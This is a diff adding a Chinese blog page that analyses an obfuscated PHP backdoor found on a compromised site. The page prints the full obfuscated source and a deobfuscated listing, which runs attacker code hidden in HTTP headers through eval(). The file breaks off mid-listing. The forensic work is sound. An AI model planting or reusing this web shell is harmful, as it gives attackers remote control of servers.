@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="E1ct36DyjSpaeX5NMAVsyzCjDs8-dQxGThgvw2i1yg0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"slagga.top","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":true,"nav":null,"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/config.min.js"></script>
+
+    <meta name="description" content="引言朋友公司的某个站发现最近被上传了一个后门程序。为了取证我们抓取了 HTTP 请求流量，看到了一堆莫名其妙看似经过混淆的请求，响应也是看似 base64 的乱码。 用了 2 个小时静态分析了一遍，并写了利用脚本。后门程序看似是乱码，实际上经过了混淆，通过 eval () 可以执行任意 PHP 命令。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一个 PHP 混淆后门的分析">
+<meta property="og:url" content="https://slagga.top/2018/06/php-back-door/index.html">
+<meta property="og:site_name" content="计算机那些事">
+<meta property="og:description" content="引言朋友公司的某个站发现最近被上传了一个后门程序。为了取证我们抓取了 HTTP 请求流量，看到了一堆莫名其妙看似经过混淆的请求，响应也是看似 base64 的乱码。 用了 2 个小时静态分析了一遍，并写了利用脚本。后门程序看似是乱码，实际上经过了混淆，通过 eval () 可以执行任意 PHP 命令。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-06-01T03:18:30.000Z">
+<meta property="article:modified_time" content="2025-06-06T06:13:40.915Z">
+<meta property="article:author" content="Slagga">
+<meta property="article:tag" content="Blog, HTML, CSS, JavaScript, Python, PHP, Java, Go, Redis, MySQL, Node.js, React, Vuejs, Git, Programming, Web Development, Blockchain">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://slagga.top/2018/06/php-back-door/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://slagga.top/2018/06/php-back-door/","path":"2018/06/php-back-door/","title":"一个 PHP 混淆后门的分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>一个 PHP 混淆后门的分析 | 计算机那些事</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0E2T2VNH5S"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-0E2T2VNH5S","only_pageview":false,"measure_protocol_api_secret":null}</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/third-party/analytics/google-analytics.min.js"></script>
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">计算机那些事</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">软件开发、定制和合作。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">229</span></a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">78</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">28</span></a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">后门源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84%E6%B3%A8"><span class="nav-number">3.</span> <span class="nav-text">附注</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Slagga"
+      src="https://avatars.githubusercontent.com/u/19620432">
+  <p class="site-author-name" itemprop="name">Slagga</p>
+  <div class="site-description" itemprop="description">计算机那些事 - 个人博客网站，涉及的领域包括IT技术、区块链行业、产品思维、运营能力、个人观点等</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">229</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">78</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpdHNsYWdnYQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gitslagga"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOnNsYWdnYUBkdWNrLmNvbQ==" title="E-Mail → mailto:slagga@duck.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://slagga.top/2018/06/php-back-door/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/19620432">
+      <meta itemprop="name" content="Slagga">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="计算机那些事">
+      <meta itemprop="description" content="计算机那些事 - 个人博客网站，涉及的领域包括IT技术、区块链行业、产品思维、运营能力、个人观点等">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="一个 PHP 混淆后门的分析 | 计算机那些事">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          一个 PHP 混淆后门的分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-06-01 11:18:30" itemprop="dateCreated datePublished" datetime="2018-06-01T11:18:30+08:00">2018-06-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-06-06 14:13:40" itemprop="dateModified" datetime="2025-06-06T14:13:40+08:00">2025-06-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Php/" itemprop="url" rel="index"><span itemprop="name">Php</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>朋友公司的某个站发现最近被上传了一个后门程序。为了取证我们抓取了 HTTP 请求流量，看到了一堆莫名其妙看似经过混淆的请求，响应也是看似 base64 的乱码。</p>
+<p>用了 2 个小时静态分析了一遍，并写了利用脚本。后门程序看似是乱码，实际上经过了混淆，通过 eval () 可以执行任意 PHP 命令。</p>
+<span id="more"></span>
+
+<h2 id="后门源代码"><a href="#后门源代码" class="headerlink" title="后门源代码"></a>后门源代码</h2><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signature For Report</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$h</span>=<span class="string">&#x27;_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss(<span class="variable">$s</span>[<span class="variable">$i</span>)m],0,<span class="variable">$e</span>))))m)m,<span class="variable">$k</span>)));<span class="variable">$o</span>=ob)m_get_c)monte)m)mnts)m();ob_end_clean)&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$H</span>=<span class="string">&#x27;m();<span class="variable">$d</span>=ba)mse64)m_encode)m(x(gzc)mompres)ms(<span class="variable">$o</span>),)m$)mk));print(&quot;&lt;)m<span class="variable">$k</span>&gt;<span class="variable">$d</span>&lt;)m/)m<span class="variable">$k</span>&gt;)m&quot;);@sessio)mn_d)mestroy();&#125;&#125;&#125;&#125;&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$N</span>=<span class="string">&#x27;mR;<span class="variable">$rr</span>)m=@<span class="variable">$r</span>[)m&quot;HTT)mP_RE)mFERER&quot;];<span class="variable">$ra</span>)m=)m@<span class="variable">$r</span>[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if(<span class="variable">$rr</span>)m&amp;&amp;<span class="variable">$ra</span>)&#123;)m<span class="variable">$u</span>=parse_u)mrl(<span class="variable">$rr</span>);p&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$u</span>=<span class="string">&#x27;<span class="variable">$e</span>)&#123;)m<span class="variable">$k</span>=$)mkh.<span class="variable">$kf</span>;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$f</span>=<span class="string">&#x27;<span class="variable">$i</span>&lt;$)ml;)m)&#123;)mfo)mr(<span class="variable">$j</span>)m=0;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>)m++,<span class="variable">$i</span>+)m+)&#123;$)mo.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>)m&#125;^$)mk&#123;<span class="variable">$j</span>&#125;;&#125;&#125;r)meturn )m<span class="variable">$o</span>;&#125;<span class="variable">$r</span>)m=<span class="variable">$_SERVE</span>)&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$O</span>=<span class="string">&#x27;[<span class="variable">$i</span>]=&quot;&quot;;<span class="variable">$p</span>)m=$)m)mss(<span class="variable">$p</span>,3)m);&#125;if(ar)mray_)mkey_exists)m()m<span class="variable">$i</span>,<span class="variable">$s</span>))&#123;$)ms[<span class="variable">$i</span>].=<span class="variable">$p</span>)m;)m<span class="variable">$e</span>=s)mtrpos)m(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>);)mif(&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$w</span>=<span class="string">&#x27;)m));)m<span class="variable">$p</span>=&quot;&quot;;fo)mr(<span class="variable">$z</span>=1;)m<span class="variable">$z</span>&lt;c)mount()m<span class="variable">$m</span>[1]);$)mz++)m)m)<span class="variable">$p.</span>=<span class="variable">$q</span>[<span class="variable">$m</span>[)m)m2][<span class="variable">$z</span>]];if(str)mpo)ms(<span class="variable">$p</span>,<span class="variable">$h</span>))m===0)&#123;<span class="variable">$s</span>)m&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$P</span>=<span class="string">&#x27;trt)molower&quot;;$)mi=<span class="variable">$m</span>[1][0)m)m].<span class="variable">$m</span>[1][1])m;<span class="variable">$h</span>=<span class="variable">$sl</span>()m<span class="variable">$ss</span>(m)md5($)mi.<span class="variable">$kh</span>)m),0,)m3));<span class="variable">$f</span>=<span class="variable">$s</span>)ml(<span class="variable">$ss</span>()m)mmd5(<span class="variable">$i.</span><span class="variable">$kf</span>),0,3&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$i</span>=<span class="string">&#x27;)marse_)mstr)m(<span class="variable">$u</span>[&quot;q)muery&quot;],$)m)mq);<span class="variable">$q</span>=array)m_values()m<span class="variable">$q</span>);pre)mg_matc)mh_all()m&quot;/([\\w)m])m)[\\w-)m]+(?:;q=0.)&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$x</span>=<span class="string">&#x27;m([\\d)m]))?,?/&quot;,)m<span class="variable">$ra</span>,<span class="variable">$m</span>))m;if(<span class="variable">$q</span>)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;<span class="variable">$_S</span>)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;<span class="variable">$sl</span>=&quot;s)m&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$y</span>=str_replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crbebbabte_funcbbtion&#x27;</span>)<span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$c</span>=<span class="string">&#x27;<span class="variable">$kh</span>=&quot;4f7)m)mf&quot;;<span class="variable">$kf</span>=&quot;2)m)m8d7&quot;;funct)mion x(<span class="variable">$t</span>)m,<span class="variable">$k</span>)&#123;$)m)mc=strlen(<span class="variable">$k</span>);<span class="variable">$l</span>=st)mrlen)m(<span class="variable">$t</span>);)m)m<span class="variable">$o</span>=&quot;&quot;;for()m<span class="variable">$i</span>=0;&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$L</span>=str_replace(<span class="string">&#x27;)m&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$c.</span><span class="variable">$f.</span><span class="variable">$N.</span><span class="variable">$i.</span><span class="variable">$x.</span><span class="variable">$P.</span><span class="variable">$w.</span><span class="variable">$O.</span><span class="variable">$u.</span><span class="variable">$h.</span><span class="variable">$H</span>)<span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$v</span>=<span class="variable">$y</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$L</span>)<span class="comment">;$v();/*</span></span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
+
+<p>经过分析，最外层混淆进行的操作是：按顺序拼接字符串，删除其中的 ‘) m’，通过 create_function () 创建一个匿名函数 $v 并执行代码。</p>
+<p>将代码导出并美化如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;4f7f&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;28d7&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span>=<span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rr</span>&amp;&amp;<span class="variable">$ra</span>)&#123;</span><br><span class="line">    <span class="variable">$u</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$rr</span>); </span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>],<span class="variable">$q</span>); </span><br><span class="line">    <span class="variable">$q</span>=<span class="title function_ invoke__">array_values</span>(<span class="variable">$q</span>);        </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$ra</span>,<span class="variable">$m</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$q</span>&amp;&amp;<span class="variable">$m</span>)&#123;</span><br><span class="line">        @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$s</span>=&amp;<span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span>=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span>=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span>=<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];  </span><br><span class="line">        <span class="variable">$h</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>)); </span><br><span class="line">        <span class="variable">$f</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>)); </span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$z</span>=<span class="number">1</span>;<span class="variable">$z</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++)  </span><br><span class="line">            <span class="variable">$p</span>.=<span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];         </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$p</span>,<span class="variable">$h</span>)===<span class="number">0</span>)&#123;        </span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>]=<span class="string">&quot;&quot;</span>;        </span><br><span class="line">            <span class="variable">$p</span>=<span class="variable">$ss</span>(<span class="variable">$p</span>,<span class="number">3</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$i</span>,<span class="variable">$s</span>))&#123;         </span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>].=<span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span>=<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>); </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$e</span>)&#123;    </span><br><span class="line">                <span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>; </span><br><span class="line">                <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">                @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),<span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="number">0</span>,<span class="variable">$e</span>))),<span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">                <span class="variable">$d</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">x</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好吧，还有第二层混淆。大概看了一下，x ($t,$k) 函数是个循环异或函数，结合 base64 函数、 gzcompress () 等函数看可能有 HTTP 请求和响应过程中的编码和加密。Payload 是从仅有的输入 $_SERVER [“HTTP_ACCEPT_LANGUAGE”] 和 $_SERVER [“HTTP_REFERER”] 中来。</p>
+<p>分析了一番，稍加修改，得到：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$kh=<span class="string">&quot;4f7f&quot;</span>;</span><br><span class="line">$kf=<span 